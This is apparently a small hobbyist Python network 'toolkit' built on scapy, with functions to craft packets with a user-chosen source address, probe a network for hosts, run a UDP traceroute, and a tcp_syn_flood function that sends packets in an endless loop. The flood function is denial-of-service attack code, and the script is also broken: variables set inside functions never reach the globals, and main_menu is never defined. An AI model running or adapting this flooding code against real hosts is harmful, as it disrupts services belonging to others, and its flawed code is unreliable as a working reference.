import menus
from scapy.all import *

# "192.168.1.1/24"
src_host = None
dst_host = None
src_network = None
dst_network = None
packet = None

def set_tool_parameters():
    src_host = input("\nSource host:")
    dst_host = input("\nDestination host:")
    src_network = input("\nSource network:")
    dst_network = input("\nDestination network:")
    print("Paremeters set!")

def reset_toolkit_data():
    src_host = None
    dst_host = None
    src_network = None
    dst_network = None
    print("Paremeters reseted!")

def build_packet():
    # packet = IP(dst=dst_host, ttl=64)/TCP(dport=80)
    # packet.src = src, packet.dst = dst, packet.dport = 80, packet.flags = "FPU"

    packet = IP(src=src_host, dst=dst_host, ttl=64)/TCP(dport=80)
    print('> Packet:')
    print(packet)
    print("> Hex:")
    hexdump(packet)
    return packet

def send_packet():
    print('> Sending the packet...')
    return send(packet)

    # response = sr1(IP(dst=dest)/TCP(dport=443, flags="FPU"))
    # response = sr1(packet)
    # response.show()
    # print(response)
    # return sr1(packet)

def reset_packet():
    packet = None

def discover_hosts():
    ans, unans = sr(IP(dst=dst_network,proto=(0,255))/"SCAPY",retry=2)
    ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )

def udp_traceroute():
    res, unans = sr(IP(dst=dst_host, ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="test.com")))
    res.make_table(lambda s,r: (s.dst, s.ttl, r.src))

def tcp_syn_flood():
    print("BUILDING TCP PACKET")
    build_packet()
    print("--------------------------------------------------")
    print("SENDING TCP PACKET")
    while 1 == 1:
        send_result = send(packet)
        print("Result:")
        print(send_result)

def main():
    main_menu()

main()